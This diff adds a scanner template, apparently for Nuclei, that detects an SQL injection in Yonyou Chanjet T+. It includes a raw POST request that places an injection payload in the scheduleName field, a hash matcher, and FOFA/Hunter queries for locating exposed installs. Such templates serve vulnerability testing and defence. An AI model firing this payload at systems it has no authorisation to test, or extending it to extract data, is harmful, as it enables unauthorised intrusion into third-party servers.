@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 0x06d49632c9dc9bcb62aeaef99612ba6b
+      raw:
+        - |
+          POST /tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=UpdateSchedule HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
+          Accept-Encoding: gzip, deflate
+          Accept: */*
+          Connection: close
+          Content-Length: 107
+
+          { "scheduleName": "' AND 1 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','1'))) AND '1'='1", "timeStr": "" }
+id: yonyou-chanjet-tplus-updateschedule-sqli
+info:
+    author: hufei
+    description: |
+        There is an SQL injection vulnerability in the Changjetcrm financial crm system under Yonyou.
+    metadata:
+        fofa-query: app="畅捷通-TPlus"
+        hunter-query: app.name="畅捷通 T+"
+        max-request: 1
+        verified: true
+    name: yonyou-chanjettplus - SQL Injection
+    reference: None
+    severity: high
+    tags:
+        - chanjet
+        - yonyou
+        - uIP
+        - 畅捷通-TPlus
+        - ajaxpro
